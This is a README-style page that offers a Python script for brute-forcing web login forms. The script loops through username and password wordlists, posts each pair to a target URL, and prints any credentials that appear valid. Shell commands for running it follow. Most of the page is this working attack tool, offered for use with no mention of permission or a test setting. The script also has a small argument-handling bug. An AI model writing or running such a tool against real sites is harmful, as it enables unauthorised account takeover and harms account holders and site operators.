# Web Login Brute-Force Script

This Python script is designed to perform brute-force attacks on web login forms by attempting a combination of usernames and passwords from specified wordlists.

Create a file named `bruteforce.py` and add the following content:
```python
#!/usr/bin/python3

import requests
import sys
from colorama import Fore
import pyfiglet

font = pyfiglet.figlet_format('Brute Force')
print(Fore.CYAN + font)

# Updated usage message
if len(sys.argv) < 3 or len(sys.argv) > 4:
    print(f"Usage: {sys.argv[0]} <url> <password_file> [username | username_file]")
    print(f"Example 1: {sys.argv[0]} http://example.com/login passwords.txt admin")
    print(f"Example 2: {sys.argv[0]} http://example.com/login passwords.txt usernames.txt")
    sys.exit(1) # Exit if usage is incorrect

login_url = sys.argv[1]
passwordlist_path = sys.argv[2]
username_arg = sys.argv[3] # This can be a username or a path to a username file

session = requests.Session()

def brute_force():
    # Determine if username_arg is a single username or a file
    usernames = []
    try:
        # Try to open it as a file first
        with open(username_arg, 'r') as uf:
            usernames = [line.strip() for line in uf if line.strip()]
        print(f"[INFO] Using usernames from file: {username_arg}")
    except FileNotFoundError:
        # If it's not a file, treat it as a single username
        usernames.append(username_arg)
        print(f"[INFO] Using single username: {username_arg}")

    if not usernames:
        print(f"[ERROR] No usernames to try. Please provide a valid username or a non-empty username file.")
        sys.exit(1)

    with open(passwordlist_path, 'r') as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    if not passwords:
        print(f"[ERROR] No passwords to try. Please provide a non-empty password file.")
        sys.exit(1)

    print(f"[INFO] Starting brute force against {login_url}...")

    for username in usernames:
        for password in passwords:
            data = {'username': username, 'password': password}

            try:
                response = session.post(login_url, data=data)

                # Check if "Invalid" is NOT in the response text.
                # You might need to adjust this condition based on the target website's error message.
                if "Invalid" not in response.text and "incorrect" not in response.text and "failed" not in response.text:
                    print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                    return # Exit after finding the first valid credential
                else:
                    print(Fore.RED + f"[-] Attempted: {username}:{password}")
            except requests.exceptions.RequestException as e:
                print(Fore.YELLOW + f"[WARNING] Request failed for {username}:{password} - {e}")
                continue # Continue to the next attempt even if one fails

    print(Fore.YELLOW + "[-] Brute force completed. No valid credentials found with the provided lists.")

brute_force()
```

---

### How to Run
Execute the script from your terminal providing the target URL, username file, and password file as arguments:
```bash
$ python3 scripts/bruteforce.py https://example.com/login.php passwords.txt username.txt
```

Alternatively, you can make the script executable and run it directly:
```bash
$ chmod +x bruteforce.py
$ ./bruteforce.py https://example.com/login.php passwords.txt username
```
Make sure you have `usernames.txt` and `passwords.txt` files (or whatever you name them) in the same directory where you run the script, or provide their full paths.

---